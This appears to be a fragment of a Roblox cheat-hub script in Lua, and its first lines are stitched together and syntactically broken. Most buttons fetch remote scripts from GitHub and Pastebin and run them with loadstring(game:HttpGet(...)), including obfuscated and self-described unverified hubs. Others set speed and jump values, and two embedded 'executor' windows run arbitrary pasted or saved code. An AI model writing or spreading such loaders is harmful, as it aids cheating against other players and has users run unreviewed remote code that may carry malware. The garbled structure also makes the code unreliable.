MainSection:NewButton("Ultra instinct", "you,ll have to find out", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)


MainSection:NewToggle("Ultra Instinct Activated", "super fast reaction time and speed and reflexses", function(state)
    if state then
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
    else
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 20
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 70
   end
end)
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab2:AddButton({
	Name = "infinity hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/bojoexploitz/yooo/main/itsobfuscated/InfinityHubTooOP", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab2:AddButton({
	Name = "Vape V4",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab2:AddButton({
	Name = "DarkRai",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/bedwars/main/Script", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab3 = Window:MakeTab({
	Name = "MM2",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Tab = Tab3:AddSection({
	Name = "MM2"
})

Tab3:AddButton({
	Name = "Demonic Hub",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.lua",true))()
      		print("button pressed")
  	end    
})

Tab3:AddButton({
	Name = "MM2 Mod Menu",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/MM2-ModMenu/main/MM2-ModMenu.lua"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab3:AddButton({
	Name = "DarkCheatClient Hub",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregory909/FolderGui-FolderHub/main/loader.lua", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab3:AddButton({
	Name = "Eclipse",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
      		print("button pressed")
  	end    
})

Tab3:AddButton({
	Name = "G-MM2 Mod",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/G-MM2/main/G-MM2.lua"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab3:AddButton({
	Name = "Unknown Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Drifter0507/scripts/main/mm2", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab3:AddButton({
	Name = "LunarHub",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/vwSaraa/LunarHub/main/mm2", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab4 = Window:MakeTab({
	Name = "EXECUTOR",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab4:AddButton({
	Name = "Neptune",
	Callback = function()
	 loadstring(game:HttpGet('https://pastebin.com/raw/y3jhxS5r'))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab4:AddButton({
	Name = "Pypixel Executor",
	Callback = function()
	  -- Meow~
-- made by Fsploit
-- owned by bl423




-- im meowing~


local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TweenService = game:GetService("TweenService")
 
 
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
 
print("Service Successful")
 
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = playerGui
 
print("ScreenGui Successful")
 
local frame = Instance.new("Frame")
frame.Parent = ScreenGui
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundTransparency = 0
frame.BackgroundColor3 = Color3.fromRGB(0,20,40)
 
print("frame Successful")
 
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1,0,1,0)
textLabel.BackgroundColor3 = Color3.fromRGB(0,20,40)
textLabel.Font = Enum.Font.GothamBold
textLabel.TextColor3 = Color3.new(.8,.8,.8)
textLabel.Text = "loading Executer"
textLabel.TextSize = 28
textLabel.Parent = frame
 
print("TextLabel Successful")
 
local loadingRing = Instance.new("ImageLabel")
loadingRing.Size = UDim2.new(0,256,0,256)
loadingRing.BackgroundTransparency = 1
loadingRing.Image = "rbxassetid://4965945816"
loadingRing.AnchorPoint = Vector2.new(0.5,0.5)
loadingRing.Position = UDim2.new(0.5,0,0.5,0)
loadingRing.Parent = frame
 
print("LoadingRing Successful")
 
ReplicatedFirst:RemoveDefaultLoadingScreen()
 
print("Remove Deafult loading screen Unsuccessful")
 
local tweenInfo = TweenInfo.new(4,Enum.EasingStyle.Linear,Enum.EasingDirection.In,-1)
local tween = TweenService:Create(loadingRing,tweenInfo,{Rotation = 360})
 
print("TweenService Successful")
 
tween:Play()
 
wait(5)
if not game:IsLoaded() then
    game.Loaded:Wait()
end
 
loadingRing.Visible = false
frame:TweenPosition(UDim2.new(0,0,1,0),"InOut","Sine",2)
wait(2)
ScreenGui:Destroy()
 
print("Loaded LoadingScreen")
print("Script Successful")

local SavesGUI = Instance.new("ScreenGui")
local MainGui = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Text = Instance.new("Folder")
local TextLabel = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local TextLabel_2 = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local TextLabel_3 = Instance.new("TextLabel")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local TextLabel_4 = Instance.new("TextLabel")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local TextLabel_5 = Instance.new("TextLabel")
local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
local TextLabel_6 = Instance.new("TextLabel")
local Searchexec = Instance.new("TextBox")
local UICorner_2 = Instance.new("UICorner")
local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
local SExec = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
local SClear = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint")
local MainSavename = Instance.new("TextBox")
local UICorner_5 = Instance.new("UICorner")
local UITextSizeConstraint_9 = Instance.new("UITextSizeConstraint")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UICorner_6 = Instance.new("UICorner")
local Mainexec = Instance.new("TextBox")
local UICorner_7 = Instance.new("UICorner")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local MSave = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local UITextSizeConstraint_10 = Instance.new("UITextSizeConstraint")
local MExec = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local UITextSizeConstraint_11 = Instance.new("UITextSizeConstraint")
local MClear = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local UITextSizeConstraint_12 = Instance.new("UITextSizeConstraint")
local ViewAllScripts = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local UITextSizeConstraint_13 = Instance.new("UITextSizeConstraint")
local Minimizebutton = Instance.new("TextButton")
local MainSaveClear = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local ButtonGui = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")

--Properties:

SavesGUI.Name = "Saves GUI"
SavesGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SavesGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SavesGUI.ResetOnSpawn = false

MainGui.Name = "MainGui"
MainGui.Parent = SavesGUI
MainGui.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
MainGui.BorderColor3 = Color3.fromRGB(29, 29, 29)
MainGui.Position = UDim2.new(0.203999996, 0, -0.589999974, 0)
MainGui.Size = UDim2.new(0.590042353, 0, 0.545798898, 0)
MainGui.Visible = false

UICorner.CornerRadius = UDim.new(0, 9)
UICorner.Parent = MainGui

Text.Name = "Text"
Text.Parent = MainGui

TextLabel.Parent = Text
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.053859964, 0, 0.164037853, 0)
TextLabel.Size = UDim2.new(0.339317769, 0, 0.07570979, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Put your script name existing at this textbox"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

UITextSizeConstraint.Parent = TextLabel
UITextSizeConstraint.MaxTextSize = 14

TextLabel_2.Parent = Text
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.691202879, 0, 0.223974764, 0)
TextLabel_2.Size = UDim2.new(0.24775584, 0, 0.0757097825, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Made by Fsploit owned by Bl423"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

UITextSizeConstraint_2.Parent = TextLabel_2
UITextSizeConstraint_2.MaxTextSize = 14

TextLabel_3.Parent = Text
TextLabel_3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_3.BorderColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_3.Position = UDim2.new(0.0251346491, 0, 0.0189274456, 0)
TextLabel_3.Size = UDim2.new(0.407540381, 0, 0.167192429, 0)
TextLabel_3.Font = Enum.Font.Highway
TextLabel_3.Text = "Scripts Save"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 40.000
TextLabel_3.TextWrapped = true

UITextSizeConstraint_3.Parent = TextLabel_3
UITextSizeConstraint_3.MaxTextSize = 40

TextLabel_4.Parent = Text
TextLabel_4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_4.BorderColor3 = Color3.fromRGB(30, 30, 30)
TextLabel_4.Position = UDim2.new(0.454219043, 0, 0.0189274456, 0)
TextLabel_4.Size = UDim2.new(0.407540381, 0, 0.167192429, 0)
TextLabel_4.Font = Enum.Font.Highway
TextLabel_4.Text = "Exploit X v0.1"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 40.000
TextLabel_4.TextWrapped = true

UITextSizeConstraint_4.Parent = TextLabel_4
UITextSizeConstraint_4.MaxTextSize = 40

TextLabel_5.Parent = Text
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.454219043, 0, 0.236593068, 0)
TextLabel_5.Size = UDim2.new(0.183123872, 0, 0.07570979, 0)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "name of the script"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

UITextSizeConstraint_5.Parent = TextLabel_5
UITextSizeConstraint_5.MaxTextSize = 18

TextLabel_6.Parent = Text
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.Position = UDim2.new(0, 0, 10, 0)
TextLabel_6.Size = UDim2.new(0, 200, 0, 50)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "Made By Fsploit aka @deadly_fsploit"
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextSize = 14.000

Searchexec.Name = "Searchexec"
Searchexec.Parent = MainGui
Searchexec.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Searchexec.Position = UDim2.new(0.0466786362, 0, 0.312302828, 0)
Searchexec.Size = UDim2.new(0.359066427, 0, 0.470031559, 0)
Searchexec.ClearTextOnFocus = false
Searchexec.Font = Enum.Font.Code
Searchexec.MultiLine = true
Searchexec.Text = ""
Searchexec.TextColor3 = Color3.fromRGB(255, 255, 255)
Searchexec.TextSize = 30.000
Searchexec.TextWrapped = true
Searchexec.TextXAlignment = Enum.TextXAlignment.Left
Searchexec.TextYAlignment = Enum.TextYAlignment.Top

UICorner_2.Parent = Searchexec

UITextSizeConstraint_6.Parent = Searchexec
UITextSizeConstraint_6.MaxTextSize = 30

SExec.Name = "SExec"
SExec.Parent = MainGui
SExec.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
SExec.BorderColor3 = Color3.fromRGB(18, 18, 18)
SExec.Position = UDim2.new(0.0484739691, 0, 0.826498449, 0)
SExec.Size = UDim2.new(0.163375229, 0, 0.10410095, 0)
SExec.Font = Enum.Font.Nunito
SExec.Text = "Execute"
SExec.TextColor3 = Color3.fromRGB(255, 255, 255)
SExec.TextScaled = true
SExec.TextSize = 20.000
SExec.TextWrapped = true

UICorner_3.CornerRadius = UDim.new(0, 6)
UICorner_3.Parent = SExec

UITextSizeConstraint_7.Parent = SExec
UITextSizeConstraint_7.MaxTextSize = 20

SClear.Name = "SClear"
SClear.Parent = MainGui
SClear.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
SClear.BorderColor3 = Color3.fromRGB(18, 18, 18)
SClear.Position = UDim2.new(0.229802519, 0, 0.826498449, 0)
SClear.Size = UDim2.new(0.163375229, 0, 0.10410095, 0)
SClear.Font = Enum.Font.Nunito
SClear.Text = "Clear"
SClear.TextColor3 = Color3.fromRGB(255, 255, 255)
SClear.TextScaled = true
SClear.TextSize = 20.000
SClear.TextWrapped = true

UICorner_4.CornerRadius = UDim.new(0, 6)
UICorner_4.Parent = SClear

UITextSizeConstraint_8.Parent = SClear
UITextSizeConstraint_8.MaxTextSize = 20

MainSavename.Name = "MainSavename"
MainSavename.Parent = MainGui
MainSavename.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
MainSavename.Position = UDim2.new(0.454219043, 0, 0.312302828, 0)
MainSavename.Size = UDim2.new(0.384819329, 0, 0.056782335, 0)
MainSavename.ClearTextOnFocus = false
MainSavename.Font = Enum.Font.Code
MainSavename.Text = ""
MainSavename.TextColor3 = Color3.fromRGB(255, 255, 255)
MainSavename.TextSize = 14.000
MainSavename.TextWrapped = true
MainSavename.TextXAlignment = Enum.TextXAlignment.Left
MainSavename.TextYAlignment = Enum.TextYAlignment.Top

UICorner_5.Parent = MainSavename

UITextSizeConstraint_9.Parent = MainSavename
UITextSizeConstraint_9.MaxTextSize = 14

ScrollingFrame.Parent = MainGui
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(17, 17, 17)
ScrollingFrame.Position = UDim2.new(0.454219043, 0, 0.391167194, 0)
ScrollingFrame.Size = UDim2.new(0.513464987, 0, 0.394321769, 0)
ScrollingFrame.ScrollBarThickness = 13

UICorner_6.Parent = ScrollingFrame

Mainexec.Name = "Mainexec"
Mainexec.Parent = ScrollingFrame
Mainexec.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Mainexec.Size = UDim2.new(0, 286, 0, 629)
Mainexec.ClearTextOnFocus = false
Mainexec.Font = Enum.Font.Code
Mainexec.MultiLine = true
Mainexec.Text = ""
Mainexec.TextColor3 = Color3.fromRGB(255, 255, 255)
Mainexec.TextSize = 14.000
Mainexec.TextWrapped = true
Mainexec.TextXAlignment = Enum.TextXAlignment.Left
Mainexec.TextYAlignment = Enum.TextYAlignment.Top

UICorner_7.Parent = Mainexec

UIAspectRatioConstraint.Parent = Mainexec
UIAspectRatioConstraint.AspectRatio = 0.430

MSave.Name = "MSave"
MSave.Parent = MainGui
MSave.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MSave.BorderColor3 = Color3.fromRGB(18, 18, 18)
MSave.Position = UDim2.new(0.804308772, 0, 0.826498449, 0)
MSave.Size = UDim2.new(0.134649917, 0, 0.10410095, 0)
MSave.Font = Enum.Font.Nunito
MSave.Text = "Save"
MSave.TextColor3 = Color3.fromRGB(255, 255, 255)
MSave.TextScaled = true
MSave.TextSize = 20.000
MSave.TextWrapped = true

UICorner_8.CornerRadius = UDim.new(0, 6)
UICorner_8.Parent = MSave

UITextSizeConstraint_10.Parent = MSave
UITextSizeConstraint_10.MaxTextSize = 20

MExec.Name = "MExec"
MExec.Parent = MainGui
MExec.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MExec.BorderColor3 = Color3.fromRGB(18, 18, 18)
MExec.Position = UDim2.new(0.454219043, 0, 0.826498449, 0)
MExec.Size = UDim2.new(0.163375229, 0, 0.10410095, 0)
MExec.Font = Enum.Font.Nunito
MExec.Text = "Execute"
MExec.TextColor3 = Color3.fromRGB(255, 255, 255)
MExec.TextScaled = true
MExec.TextSize = 20.000
MExec.TextWrapped = true

UICorner_9.CornerRadius = UDim.new(0, 6)
UICorner_9.Parent = MExec

UITextSizeConstraint_11.Parent = MExec
UITextSizeConstraint_11.MaxTextSize = 20

MClear.Name = "MClear"
MClear.Parent = MainGui
MClear.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MClear.BorderColor3 = Color3.fromRGB(18, 18, 18)
MClear.Position = UDim2.new(0.62657094, 0, 0.826498449, 0)
MClear.Size = UDim2.new(0.163375229, 0, 0.10410095, 0)
MClear.Font = Enum.Font.Nunito
MClear.Text = "Clear"
MClear.TextColor3 = Color3.fromRGB(255, 255, 255)
MClear.TextScaled = true
MClear.TextSize = 20.000
MClear.TextWrapped = true

UICorner_10.CornerRadius = UDim.new(0, 6)
UICorner_10.Parent = MClear

UITextSizeConstraint_12.Parent = MClear
UITextSizeConstraint_12.MaxTextSize = 20

ViewAllScripts.Name = "ViewAllScripts"
ViewAllScripts.Parent = MainGui
ViewAllScripts.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
ViewAllScripts.BorderColor3 = Color3.fromRGB(18, 18, 18)
ViewAllScripts.Position = UDim2.new(0.0484739691, 0, 0.236593053, 0)
ViewAllScripts.Size = UDim2.new(0.359066427, 0, 0.0504731871, 0)
ViewAllScripts.Font = Enum.Font.Nunito
ViewAllScripts.Text = "Check All Scripts (WIP)"
ViewAllScripts.TextColor3 = Color3.fromRGB(255, 255, 255)
ViewAllScripts.TextScaled = true
ViewAllScripts.TextSize = 18.000
ViewAllScripts.TextWrapped = true

UICorner_11.CornerRadius = UDim.new(0, 6)
UICorner_11.Parent = ViewAllScripts

UITextSizeConstraint_13.Parent = ViewAllScripts
UITextSizeConstraint_13.MaxTextSize = 18

Minimizebutton.Name = "Minimize button"
Minimizebutton.Parent = MainGui
Minimizebutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minimizebutton.BackgroundTransparency = 1.000
Minimizebutton.Position = UDim2.new(0.894075394, 0, 0, 0)
Minimizebutton.Size = UDim2.new(0, 35, 0, 20)
Minimizebutton.Font = Enum.Font.SourceSans
Minimizebutton.Text = "-"
Minimizebutton.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimizebutton.TextSize = 50.000

MainSaveClear.Name = "MainSaveClear"
MainSaveClear.Parent = MainGui
MainSaveClear.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
MainSaveClear.BorderColor3 = Color3.fromRGB(22, 22, 22)
MainSaveClear.Position = UDim2.new(0.849560738, 0, 0.312302828, 0)
MainSaveClear.Size = UDim2.new(0, 44, 0, 18)
MainSaveClear.Font = Enum.Font.SourceSans
MainSaveClear.Text = "Clear"
MainSaveClear.TextColor3 = Color3.fromRGB(255, 255, 255)
MainSaveClear.TextSize = 14.000

UICorner_12.Parent = MainSaveClear

ButtonGui.Name = "ButtonGui"
ButtonGui.Parent = SavesGUI
ButtonGui.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
ButtonGui.Position = UDim2.new(0.886600554, 0, 0, 0)
ButtonGui.Size = UDim2.new(0, 64, 0, 31)
ButtonGui.Font = Enum.Font.SourceSans
ButtonGui.Text = "Open"
ButtonGui.TextColor3 = Color3.fromRGB(255, 255, 255)
ButtonGui.TextSize = 15.000

UICorner_13.Parent = ButtonGui

-- Scripts:

local function IKPYPSX_fake_script() -- SExec.LocalScript 
	local script = Instance.new('LocalScript', SExec)

	
	local txtbox = script.Parent.Parent.Searchexec
	local btn = script.Parent
	
	btn.MouseButton1Up:Connect(function()
		loadstring(readfile("SavedScs/"..txtbox.Text..""))()
	end)
end
coroutine.wrap(IKPYPSX_fake_script)()
local function JVXNXHU_fake_script() -- SClear.LocalScript 
	local script = Instance.new('LocalScript', SClear)


	
local txtbox = script.Parent.Parent.Searchexec
	local btn = script.Parent
	
	btn.MouseButton1Up:Connect(function()
		txtbox.Text = ""
	end)
end
coroutine.wrap(JVXNXHU_fake_script)()
local function NQQZT_fake_script() -- MSave.LocalScript 
	local script = Instance.new('LocalScript', MSave)


	local txtbox = script.Parent.Parent.ScrollingFrame.Mainexec
	local title = script.Parent.Parent.MainSavename
	local btn = script.Parent
	
	btn.MouseButton1Up:Connect(function()
		if not (isfolder == "SavedScs") then
			makefolder("SavedScs")
		end
		writefile("SavedScs/"..title.Text..".txt", ""..txtbox.Text.."")
	
	end)
end
coroutine.wrap(NQQZT_fake_script)()
local function AGWWB_fake_script() -- MExec.LocalScript 
	local script = Instance.new('LocalScript', MExec)


	local btn = script.Parent
	
	btn.MouseButton1Up:Connect(function()
		loadstring(script.Parent.Parent.ScrollingFrame.Mainexec.Text)()
	end)
end
coroutine.wrap(AGWWB_fake_script)()
local function BNQSV_fake_script() -- MClear.LocalScript 
	local script = Instance.new('LocalScript', MClear)


	local txtbox = script.Parent.Parent.ScrollingFrame.Mainexec
	local btn = script.Parent
	
	btn.MouseButton1Up:Connect(function()
		txtbox.Text = ""
	end)
end
coroutine.wrap(BNQSV_fake_script)()
local function UPYH_fake_script() -- Minimizebutton.LocalScript 
	local script = Instance.new('LocalScript', Minimizebutton)


	function click()
		script.Parent.Parent.Parent.ButtonGui.Visible = true
		script.Disabled = true
		script.Parent.Parent:TweenPosition(
	
			UDim2.new(0.204, 0, -0.59, 0),
			"InOut",
			"Quad",
			0.5,
			false
	
	
		)
	
		wait(1)
		script.Disabled = false
		script.Parent.Parent.Visible = false
	end
	script.Parent.MouseButton1Click:Connect(click)
end
coroutine.wrap(UPYH_fake_script)()
local function MXFUOL_fake_script() -- MainSaveClear.LocalScript 
	local script = Instance.new('LocalScript', MainSaveClear)


	local txtbox = script.Parent.Parent.MainSavename
	local btn = script.Parent
	
	btn.MouseButton1Up:Connect(function()
		txtbox.Text = ""
	end)
end
coroutine.wrap(MXFUOL_fake_script)()
-- ButtonGui.LocalScript is disabled.
local function POSRGLY_fake_script() -- ButtonGui.LocalScript 
	local script = Instance.new('LocalScript', ButtonGui)

	
	function click()
		script.Parent.Visible = false
		script.Disabled = true
		script.Parent.Parent.MainGui.Visible = true
		script.Parent.Parent.MainGui:TweenPosition(
	
			UDim2.new(0.202, 0, 0.227, 0),
			"InOut",
			"Quad",
			0.5,
			false
	
		)
		wait(1)
		script.Disabled = false
	end
	script.Parent.MouseButton1Click:Connect(click)
end
coroutine.wrap(POSRGLY_fake_script)()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab4:AddButton({
	Name = "Exploit X executor",
	Callback = function()
	  -- i didnt steal this i swear
-- Gui to Lua
-- Version: 3.2
 
-- Instances:
 
local stopst3 = Instance.new("ScreenGui")
local windowphj = Instance.new("Frame")
local labelframe = Instance.new("Frame")
local label = Instance.new("TextLabel")
local scroller = Instance.new("ScrollingFrame")
local layout = Instance.new("UIListLayout")
local stringbox = Instance.new("TextBox")
local execute = Instance.new("TextButton")
local UIGradient = Instance.new("UIGradient")
local clear = Instance.new("TextButton")
local UIGradient_2 = Instance.new("UIGradient")
local inject = Instance.new("TextButton")
local UIGradient_3 = Instance.new("UIGradient")
 
 
--strokes update
 
local strok1 = Instance.new("UIStroke",execute)
local strok2 = Instance.new("UIStroke",clear)
local strok3 = Instance.new("UIStroke",inject)
 
--Properties:
 
stopst3.Name = "stop.st3"
stopst3.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
stopst3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
stopst3.DisplayOrder = 999999999
stopst3.ResetOnSpawn = false
 
windowphj.Name = "window.phj"
windowphj.Parent = stopst3
windowphj.BackgroundColor3 = Color3.fromRGB(179, 255, 152)
windowphj.BorderColor3 = Color3.fromRGB(0, 0, 0)
windowphj.BorderSizePixel = 0
windowphj.Position = UDim2.new(0.0568335578, 0, 0.0612648204, 0)
windowphj.Size = UDim2.new(0, 367, 0, 167)
windowphj.Active = true
windowphj.Draggable = true
 
labelframe.Name = "labelframe"
labelframe.Parent = windowphj
labelframe.BackgroundColor3 = Color3.fromRGB(96, 172, 91)
labelframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
labelframe.BorderSizePixel = 0
labelframe.Size = UDim2.new(0, 367, 0, 30)
 
label.Name = "label"
label.Parent = labelframe
label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
label.BackgroundTransparency = 1.000
label.BorderColor3 = Color3.fromRGB(0, 0, 0)
label.BorderSizePixel = 0
label.Position = UDim2.new(0.0599455051, 0, 0.100000001, 0)
label.Size = UDim2.new(0, 323, 0, 24)
label.Font = Enum.Font.PermanentMarker
label.Text = "Exploit (X) EXECUTOR"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextScaled = true
label.TextSize = 14.000
label.TextWrapped = true
 
scroller.Name = "scroller"
scroller.Parent = windowphj
scroller.Active = true
scroller.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scroller.BorderColor3 = Color3.fromRGB(0, 0, 0)
scroller.Position = UDim2.new(0.0217983648, 0, 0.19760479, 0)
scroller.Size = UDim2.new(0, 337, 0, 96)
scroller.BottomImage = "rbxassetid://7294252496"
scroller.MidImage = "rbxassetid://7294252496"
scroller.TopImage = "rbxassetid://7294252496"
 
layout.Name = "layout"
layout.Parent = scroller
layout.SortOrder = Enum.SortOrder.LayoutOrder
 
stringbox.Name = "stringbox"
stringbox.Parent = scroller
stringbox.BackgroundColor3 = Color3.fromRGB(202, 202, 202)
stringbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
stringbox.BorderSizePixel = 0
stringbox.Size = UDim2.new(0.959999979, 1, 1, 1)
stringbox.Font = Enum.Font.SourceSans
stringbox.Text = ""
stringbox.MultiLine = true
stringbox.ClearTextOnFocus = false
stringbox.TextColor3 = Color3.fromRGB(0, 0, 0)
stringbox.TextSize = 14.000
stringbox.TextXAlignment = Enum.TextXAlignment.Left
stringbox.TextYAlignment = Enum.TextYAlignment.Top
 
injected = false
executedstuff = {} 
execute.Name = "execute"
execute.Parent = windowphj
execute.BackgroundColor3 = Color3.fromRGB(110, 212, 255)
execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
execute.BorderSizePixel = 0
execute.Position = UDim2.new(0.0245231614, 0, 0.832335353, 0)
execute.Size = UDim2.new(0, 104, 0, 19)
execute.Font = Enum.Font.SourceSans
execute.Text = "execute"
execute.TextColor3 = Color3.fromRGB(0, 0, 0)
execute.TextSize = 13.000
strok1.LineJoinMode = Enum.LineJoinMode.Bevel
strok1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
execute.MouseButton1Down:Connect(function()
	if injected == true then
		assert(loadstring(stringbox.Text))()
	end
end)
 
UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(83, 109, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Rotation = 90
UIGradient.Parent = execute
 
clear.Name = "clear"
clear.Parent = windowphj
clear.BackgroundColor3 = Color3.fromRGB(110, 212, 255)
clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
clear.BorderSizePixel = 0
clear.Position = UDim2.new(0.350143462, 0, 0.832335353, 0)
clear.Size = UDim2.new(0, 104, 0, 19)
clear.Font = Enum.Font.SourceSans
clear.Text = "clear"
